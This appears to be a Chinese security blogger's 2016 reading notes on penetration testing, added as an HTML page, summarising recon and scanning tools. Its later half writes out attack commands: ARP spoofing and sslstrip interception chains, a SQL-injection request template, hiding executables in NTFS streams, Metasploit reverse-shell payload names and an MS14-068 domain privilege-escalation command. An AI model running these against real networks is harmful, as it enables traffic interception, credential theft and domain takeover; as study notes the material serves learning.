@@ -1,0 +1,803 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="可以暂停音乐哦！ 
+
+
+
+
+等拿到所有钱要好好规划一下怎么充分的利用和投资自己。现在有时间会去锻炼，在电脑前坐久了或者晚睡精神不足会导致心情很低落很差。最近也在计划着调整自己的学习方法， 以一周理论、一周实践。这周事情烦乱从周一开始吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="阅读笔记：「渗透测试」">
+<meta property="og:url" content="http://yoursite.com/2016/07/06/阅读笔记：「渗透测试」/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="可以暂停音乐哦！ 
+
+
+
+
+等拿到所有钱要好好规划一下怎么充分的利用和投资自己。现在有时间会去锻炼，在电脑前坐久了或者晚睡精神不足会导致心情很低落很差。最近也在计划着调整自己的学习方法， 以一周理论、一周实践。这周事情烦乱从周一开始吧。">
+<meta property="og:updated_time" content="2016-07-06T08:08:48.070Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="阅读笔记：「渗透测试」">
+<meta name="twitter:description" content="可以暂停音乐哦！ 
+
+
+
+
+等拿到所有钱要好好规划一下怎么充分的利用和投资自己。现在有时间会去锻炼，在电脑前坐久了或者晚睡精神不足会导致心情很低落很差。最近也在计划着调整自己的学习方法， 以一周理论、一周实践。这周事情烦乱从周一开始吧。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> 阅读笔记：「渗透测试」 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                阅读笔记：「渗透测试」
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-06T15:22:34+08:00" content="2016-07-06">
+              2016-07-06
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/06/阅读笔记：「渗透测试」/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/06/阅读笔记：「渗透测试」/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <font color="red">可以暂停音乐哦！ </font>
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=29947420&auto=0&height=66"></iframe>
+
+
+<p>等拿到所有钱要好好规划一下怎么充分的利用和投资自己。<br>现在有时间会去锻炼，在电脑前坐久了或者晚睡精神不足会导致心情很低落很差。<br>最近也在计划着调整自己的学习方法， 以一周理论、一周实践。这周事情烦乱从周一开始吧。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>有四个模块：</p>
+<h3 id="RECON「侦察模块」"><a href="#RECON「侦察模块」" class="headerlink" title="RECON「侦察模块」"></a>RECON「侦察模块」</h3><p>侦察模块分为三类、Domain模块、Person、Parse salesforce</p>
+<h4 id="1-Domain"><a href="#1-Domain" class="headerlink" title="1. Domain"></a>1. Domain</h4><pre><code>1. Passive
+    被动扫描：会调用ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites, and recon-ng进行信息收集。
+
+2. Active
+ 主动扫描：WAF00W, traceroute, Whatweb进行信息收集。最好在Kali下运行，Kali已经集成了以上工具。
+会通过github、Google、Shodan等进行信息收集
+</code></pre><p>提示！：其中 recon-ng比较复杂需要添加API，我这么懒肯定用不到：</p>
+<blockquote>
+<p>   recon-ng<br>  keys add bing_api <value><br>  keys add builtwith_api <value><br>  keys add fullcontact_api <value><br>  keys add github_api <value><br>  keys add google_api <value><br>  keys add google_cse <value><br>  keys add hashes_api <value><br>  keys add shodan_api <value></value></value></value></value></value></value></value></value></p>
+</blockquote>
+<p>然后在FreeBuf看到一篇关于Recon-ng的：<br><a href="http://www.freebuf.com/articles/web/7385.html" target="_blank" rel="external">Recon-ng</a> </p>
+<h4 id="2-Person"><a href="#2-Person" class="headerlink" title="2. Person"></a>2. Person</h4><pre><code>First name:
+    名
+Last name:
+    姓
+</code></pre><blockquote>
+<p>   我理解应该是人肉搜索，结合了多个网站的信息。</p>
+</blockquote>
+<h4 id="3-Parse-salesforce"><a href="#3-Parse-salesforce" class="headerlink" title="3. Parse salesforce"></a>3. Parse salesforce</h4><blockquote>
+<p>   会通过这个网站查找信息：<br>    <a href="https://connect.data.com/login" target="_blank" rel="external">https://connect.data.com/login</a></p>
+</blockquote>
+<h3 id="SCANNING"><a href="#SCANNING" class="headerlink" title="SCANNING"></a>SCANNING</h3><h4 id="4-Generate-target-list"><a href="#4-Generate-target-list" class="headerlink" title="4. Generate target list"></a>4. Generate target list</h4><pre><code>1.  Local area network
+2.  NetBIOS
+3.  netdiscover
+4.  Ping sweep
+</code></pre><blockquote>
+<p>   扫描网络发现主机，通过nmap、arp扫描、ping扫描等。</p>
+</blockquote>
+<h4 id="5-CIDR-List-IP-Range-or-URL"><a href="#5-CIDR-List-IP-Range-or-URL" class="headerlink" title="5. CIDR, List, IP, Range, or URL"></a>5. CIDR, List, IP, Range, or URL</h4><pre><code>1.  External
+2.  Internal
+</code></pre><blockquote>
+<p>   主机依靠nmap来扫描，全部都分为外部扫描和内部扫描，翻译的不是准确所以直接不翻译：</p>
+<ul>
+<li>External scan will set the nmap source port to 53 and the max-rrt-timeout to 1500ms.<ul>
+<li>Internal scan will set the nmap source port to 88 and the max-rrt-timeout to 500ms.</li>
+<li>Nmap is used to perform host discovery, port scanning, service enumeration and OS identification.</li>
+<li>Matching nmap scripts are used for additional enumeration.</li>
+<li>Matching Metasploit auxiliary modules are also leveraged.</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="8-Open-multiple-tabs-in-Firefox"><a href="#8-Open-multiple-tabs-in-Firefox" class="headerlink" title="8. Open multiple tabs in Firefox"></a>8. Open multiple tabs in Firefox</h4><pre><code>1.  List
+2.  Directories from a domain&apos;s robot.txt.
+</code></pre><h4 id="9-Nikto"><a href="#9-Nikto" class="headerlink" title="9. Nikto"></a>9. Nikto</h4><pre><code>1.  List of IPs.
+2.  List of IP:port.
+</code></pre><h4 id="10-SSL"><a href="#10-SSL" class="headerlink" title="10. SSL"></a>10. SSL</h4><pre><code>检查证书
+</code></pre><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="11-Crack-WiFi"><a href="#11-Crack-WiFi" class="headerlink" title="11. Crack WiFi"></a>11. Crack WiFi</h4><h4 id="12-Parse-XML"><a href="#12-Parse-XML" class="headerlink" title="12. Parse XML"></a>12. Parse XML</h4><pre><code>导入扫描结果，支持 Burp (Base64)、Nessus、Nexpose、 Nmap、Qualys
+</code></pre><h4 id="13-Generate-a-malicious-payload"><a href="#13-Generate-a-malicious-payload" class="headerlink" title="13. Generate a malicious payload"></a>13. Generate a malicious payload</h4><p>metasploit中的payload</p>
+<pre><code>1.  android/meterpreter/reverse_tcp
+2.  cmd/windows/reverse_powershell
+3.  linux/x64/shell_reverse_tcp
+4.  linux/x86/meterpreter/reverse_tcp
+5.  osx/x64/shell_reverse_tcp
+6.  windows/meterpreter/reverse_tcp
+7.  windows/x64/meterpreter/reverse_tcp
+</code></pre><h4 id="14-Start-a-Metasploit-listener"><a href="#14-Start-a-Metasploit-listener" class="headerlink" title="14. Start a Metasploit listener"></a>14. Start a Metasploit listener</h4><pre><code>监听，和上面列表一样
+</code></pre><h4 id="15-Update"><a href="#15-Update" class="headerlink" title="15. Update"></a>15. Update</h4><p>感觉不会用上，特别是nikto感觉没一次能扫出什么东西来。给我一种感觉是像这种工具只是把大多数工具集合在一起，然后来调用。所以不用麻烦一个一个命令去打，所以这也是有好处的。</p>
+<hr>
+<p>感觉这样记笔记很累呀，翻译出来写的太详细了，还是偷懒写精简就好了。</p>
+<h3 id="PeepingTom"><a href="#PeepingTom" class="headerlink" title="PeepingTom"></a>PeepingTom</h3><pre><code>用于渗透的时候扫描C段的机器，然而你要去一个一个的打开查看是什么服务，这软件就是用来快速帮你截图查看用的。我记得Kali2下面也有类似的工具。
+</code></pre><p>使用前需要安装：<br><a href="https://bitbucket.org/LaNMaSteR53/peepingtom.git" target="_blank" rel="external">PeepingTom</a><br>CURL<br>phantomjs：<a href="http://phantomjs.org/download.html" target="_blank" rel="external">下载地址</a> </p>
+<p>参数：<br>-l    加载文本<br>-x    加载nessus、nmap扫描的xml文件<br>-s    加载一个目标，我觉得没有什么必要<br>-o    输出目录<br>-t    超时时间，默认则是8秒<br>-v    详细过程<br>-b    在浏览器中打开结果     </p>
+<font color="red">“渗透测试人员要富有创造力，并且能调用所有的资源。”</font>
+
+
+
+<h3 id="SQLninja"><a href="#SQLninja" class="headerlink" title="SQLninja"></a>SQLninja</h3><p>这个工具查了下资料看别人说只能支持SQLSERVER数据库注入，然而我本地没有测试。</p>
+<p>先记录下基本用法，下次遇到注入点可以测试下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--httprequest_start--</span><br><span class="line"></span><br><span class="line">GET http://192.168.4.104/php/newsshow.php?cid=4';__SQL2INJECT__&amp;id=19';__SQL2INJECT__ HTTP/1.1</span><br><span class="line">Host: 192.168.4.104</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=t7jqbvcd9l52g7g8l5aqqvqg21</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">--httprequest_end--</span><br></pre></td></tr></table></figure>
+<p>sqlninja -f sql_get.conf -m -f</p>
+<h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo “1” &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">启用转发</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000</span><br><span class="line">使用Iptables过滤数据包</span><br><span class="line"></span><br><span class="line">sslstrip -l 1000</span><br><span class="line">监听 1000端口</span><br><span class="line"></span><br><span class="line">ettercap –T –q –M arp:remote // //</span><br><span class="line">对所有子网进行ARP欺骗</span><br></pre></td></tr></table></figure>
+<h3 id="ARP毒化"><a href="#ARP毒化" class="headerlink" title="ARP毒化"></a>ARP毒化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo “1” &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">启用转发</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</span><br><span class="line">利用ARP毒化，重定向受害者的流量传送给攻击者。</span><br><span class="line"></span><br><span class="line">也可以：</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1  192.168.1.2</span><br><span class="line">流量由网关到攻击者再到受攻击者</span><br><span class="line"></span><br><span class="line">driftnet -i eth0</span><br><span class="line">查看图片</span><br></pre></td></tr></table></figure>
+<h3 id="Dsniff-amp-ARP欺骗攻击"><a href="#Dsniff-amp-ARP欺骗攻击" class="headerlink" title="Dsniff&amp;ARP欺骗攻击"></a>Dsniff&amp;ARP欺骗攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo “1” &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1 192.168.1.12</span><br><span class="line"></span><br><span class="line">dsniff -i eth0</span><br></pre></td></tr></table></figure>
+<h3 id="Hamster"><a href="#Hamster" class="headerlink" title="Hamster"></a>Hamster</h3><pre><code>echo “1” &gt;&gt; /proc/sys/net/ipv4/ip_forward
+启用IP转发功能
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
+iptables启用sslstrip
+
+sslstrip -f -a -k -l 1000 -w /root/out.txt
+
+arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
+ARP欺骗
+
+ferret -i eth0
+
+hamster
+
+driftnet -i eth0
+查看图片
+</code></pre><h3 id="国外密码字典"><a href="#国外密码字典" class="headerlink" title="国外密码字典"></a>国外密码字典</h3><p><a href="https://downloads.skullsecurity.org/passwords/" target="_blank" rel="external">https://downloads.skullsecurity.org/passwords/</a></p>
+<h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><pre><code>searchsploit joomla
+搜索漏洞
+</code></pre><h3 id="ADS"><a href="#ADS" class="headerlink" title="ADS"></a>ADS</h3><pre><code>把1.exe隐藏在1.txt文件中:
+type c:\1.exe &gt; 1.txt:1.exe
+
+Windows7改变了这个功能。
+给符号链接设置隐藏的文件属性：
+attrib +h/L 1.exe
+
+保持隐藏文件
+mkdir \\?\c:\tmp\&quot;..\&quot;
+
+把恶意文件放到该目录里：
+move 1.exe &quot;\\?\c:\tmp\..&quot;
+
+复制出来：
+copy &quot;\\?\c:\tmp\.. \1.exe&quot;
+</code></pre><hr>
+<p>好了，以上是对那本书想记下来的东西，其实这类工具书还是不推荐买的。其实自己真是作贱看到封面这么好看了目录会去买，看完后就各种喷。</p>
+<p>下面是记录另外一些有用的。</p>
+<h3 id="2-Scanning"><a href="#2-Scanning" class="headerlink" title="2.    Scanning"></a>2.    Scanning</h3><p>nmap扫描一些常用端口：</p>
+<pre><code>1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,7-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2100,2103,2121,2199,2207,2222,2323,2362,2380-2381,2525,2533,2598,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535
+</code></pre><p>常用：</p>
+<pre><code>21,22,23,25,139,443,445,631,3389,6000-6009,8080,8000,8443
+</code></pre><p>不过我比较喜欢这样：</p>
+<pre><code>1-1024,1433,1521,1721,3306,3389,8000-9000
+</code></pre><p>当然有时候如果都扫不到什么，也会从1-65535端口扫，不放过一个。</p>
+<p>服务对照表：</p>
+<blockquote>
+<p>FTP: 21<br>SSH: 22<br>Telnet: 23<br>SMTP: 25<br>Finger: 79<br>HTTP: 80<br>Kerberos: 88<br>POP3: 110<br>SUNRPC (Unix RPC): 111 (think: rpcinfo)<br>NetBIOS: 139<br>IMAP 143<br>LDAP: 389<br>HTTPS: 443<br>LotusNotes: 1352<br>Microsoft DS: 445<br>RSH: 514<br>CUPS: 631<br>NFS: 2049<br>Webrick(Ruby Webserver): 3000<br>RDP: 3389<br>Munin: 4949<br>SIP: 5060 <em>PCAnywhere: 5631 (5632)<br>NRPE (</em>nix) /NSCLIENT++ (win): 5666 (evidence of Nagios server on network)<br>Alt-HTTP: 8080<br>Alt-HTTP tomcat: 9080<br>Another HTTP: 8000 (mezzanine in development mode for example)<br>Nessus HTTPS: 8834<br>Proxmox: 8006<br>Splunk: 8089 (also on 8000)<br>Alt HTTPS: 8443<br>vSphere: 9443<br>X11: 6000-6009 (+1 to portnum for additional displays) (see xspy, xwd, xkey for exploitation)<br>VNC: 5900, 5901+ (Same as X11; +1 to portnum for each user/dipslay over VNC. SPICE is usually in this range as well) Printers: 9100, 515<br>Dropbox lansync: 17500</p>
+<p>   Java RMI - 1099, 1098<br>coldfusion default stand alone - 8500<br>IPMI UDP(623) (easy crack or auth bypass)<br>6002, 7002 (sentinel license monitor (reverse dir traversal, sometimes as SYSTEM))<br>GlassFish: 4848<br>easy copy - 9060<br>IBM Web Sphere: 9060<br>Webmin or BackupExec: 10000<br>memcached: 11211<br>DistCC: 3632<br>SAP Router: 3299</p>
+</blockquote>
+<h4 id="数据库端口对照表"><a href="#数据库端口对照表" class="headerlink" title="数据库端口对照表"></a>数据库端口对照表</h4><pre><code>3306,1521-1527,5432,5433,1433,3050,3351,1583,8471,9471,27017,28017,27080,5984,900,9160,7474,6379,8098
+</code></pre><blockquote>
+<p>   MySQL: 3306<br>PostgreSQL: 5432<br>PostgreSQL 9.2: 5433<br>Oracle TNS Listener: 1521-1527<br>Oracle XDB: 2100<br>MSSQL: 1433<br>Firebird / Interbase: 3050<br>PervasiveSQL: 3351, 1583<br>DB2/AS400 8471, 9471<br>Sybase 5000<br>MongoDB: 27017,28017,27080<br>CouchDB: 5984<br>Hbase 9000<br>Cassandra:9160<br>Neo4j: 7474<br>Redis: 6379<br>Riak: 8098</p>
+</blockquote>
+<h4 id="SCADA-ICS"><a href="#SCADA-ICS" class="headerlink" title="SCADA / ICS"></a>SCADA / ICS</h4><p>工控接触的不多，唯一接触过在某某某个地方。有变电站、还有一些其它设备忘记叫什么名字了，当时自己也很傻以为接跟网线跟搞渗透一样。当时还开了metasploit自动化去溢出。 感觉WEB狗如果除了站点外难道就行不通了嘛。  然后某国企请了专门搞工控的团队。当时我就惊呆了他们好像在用wireshar抓包分析。  然后很尴尬的别人也是从网上找工控的漏洞来搞。</p>
+<blockquote>
+<p>   BACnet/IP: UDP/47808<br>DNP3: TCP/20000, UDP/20000<br>EtherCAT: UDP/34980<br>Ethernet/IP: TCP/44818, UDP/2222, UDP/44818<br>FL-net: UDP/55000 to 55003<br>Foundation Fieldbus HSETCP/1089 to 1091, UDP/1089 to 1091<br>ICCP: TCP/102<br>Modbus TCP: TCP/502<br>OPC UA Binary: Vendor Application Specific<br>OPC UA Discovery Server: TCP/4840<br>OPC UA XML: TCP/80, TCP/443<br>PROFINET: TCP/34962 to 34964, UDP/34962 to 34964<br>ROC PLus: TCP/UDP 4000</p>
+</blockquote>
+<h4 id="zmap"><a href="#zmap" class="headerlink" title="zmap"></a>zmap</h4><p>安装方法，kali下需要更新源。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zmap/zmap.git</span><br><span class="line">sudo apt-get install libgmp3-dev libpcap-dev gengetopt</span><br><span class="line">sudo apt-get install build-essential cmake flex byacc libcap2-bin libdumbnet-dev libevent-dev</span><br><span class="line">cmake ./</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">setcap cap_net_raw=ep /usr/local/sbin/zmap</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -M udp -p 137 --probe-args=file:examples/udp-probes/netbios_137.pkt</span><br></pre></td></tr></table></figure>
+<p>我想后面的netbios_137.pkt是识别这类型的插件。以后用到的时候再好好研究，其它插件：<br><a href="https://github.com/zmap/zmap/tree/master/examples" target="_blank" rel="external">https://github.com/zmap/zmap/tree/master/examples</a></p>
+<p>其它系统安装参考这里：<a href="https://zmap.io/download.html" target="_blank" rel="external">zmap</a> </p>
+<h4 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14 068"></a>Ms14 068</h4><p>内网域控提权神器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python goldenPac.py -dc-ip 172.16.102.15 -target-ip 172.16.102.15 exploit.local/notanadmin:ASDqwe123@dc1</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/01/后台登录框Time-based-Blind/" rel="next" title="后台登录框Time-based Blind">
+                <i class="fa fa-chevron-left"></i> 后台登录框Time-based Blind
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/10/MacBook-Pro/" rel="prev" title="MacBook Pro">
+                MacBook Pro <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/07/06/阅读笔记：「渗透测试」/"
+           data-title="阅读笔记：「渗透测试」" data-url="http://yoursite.com/2016/07/06/阅读笔记：「渗透测试」/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
